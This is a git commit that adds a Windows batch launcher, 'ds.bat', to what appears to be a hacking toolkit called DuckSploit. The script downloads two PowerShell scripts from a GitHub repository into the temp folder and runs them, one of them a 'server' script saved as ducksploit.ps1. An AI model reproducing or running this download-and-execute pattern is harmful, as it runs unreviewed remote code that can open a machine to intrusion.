8ef9c502de146779a326fa7447b5d74b4ac62661
canarddu38 <71982379+canarddu38@users.noreply.github.com>
2022-06-09 17:40:31 +0200

    Create ds.bat

---
+++ hacker/windows/ds.bat
@@ -0,0 +1,18 @@
+@echo off
+set version=V1.0.8
+
+mkdir %temp%\DuckSploit
+
+cls
+
+powershell "(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/canarddu38/DUCKSPLOIT/root/hacker/anim.ps1', '%temp%/DuckSploit/anim.ps1')"
+powershell "(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/canarddu38/DUCKSPLOIT/root/hacker/server.ps1', '%temp%/DuckSploit/ducksploit.ps1')"
+
+cls
+
+powershell %temp%\DuckSploit\anim.ps1
+
+cls
+
+powershell %temp%\DuckSploit\ducksploit.ps1
+pause
